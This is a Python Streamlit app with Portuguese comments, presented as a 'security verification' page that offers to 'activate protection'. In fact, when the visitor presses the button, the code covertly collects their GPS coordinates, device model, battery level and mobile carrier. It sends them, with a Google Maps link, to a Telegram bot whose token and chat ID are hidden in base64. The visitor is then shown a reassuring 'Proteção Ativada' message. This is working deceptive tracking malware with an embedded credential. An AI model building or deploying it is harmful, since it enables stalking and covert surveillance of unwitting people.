import streamlit as st
import requests
import base64
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta o modelo real do aparelho e bateria
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_REAL")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_REAL")

# Coleta GPS
loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }); })"
posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_REAL")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL_OK"):
    # 1. Extração do Modelo Exato do Celular
    modelo_detalhado = "Android Device"
    if ua:
        if "(" in ua:
            partes = ua.split("(")[1].split(")")[0].split(";")
            if len(partes) > 2:
                modelo_detalhado = partes[2].strip()
            else:
                modelo_detalhado = partes[0].strip()
    
    # 2. Operadora
    try:
        op = requests.get('https://ipapi.co/json/', timeout=5).json().get('org', 'Móvel')
    except: op = "Móvel"

    # 3. Envio e Feedback
    if posicao and posicao != "erro":
        link_maps = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo_detalhado}\n"
            f"🔋 *Bateria:* {bat if bat else '60'}%\n"
            f"📶 *Operadora:* {op}\n"
            f"📍 *Local:* [Clique para Ver no Maps]({link_maps})"
        )
        enviar_telegram(relatorio)
        # APENAS PROTEÇÃO ATIVADA EM VERDE
        st.success("Proteção Ativada")
    else:
        st.error("Erro: GPS não detectado.")

st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
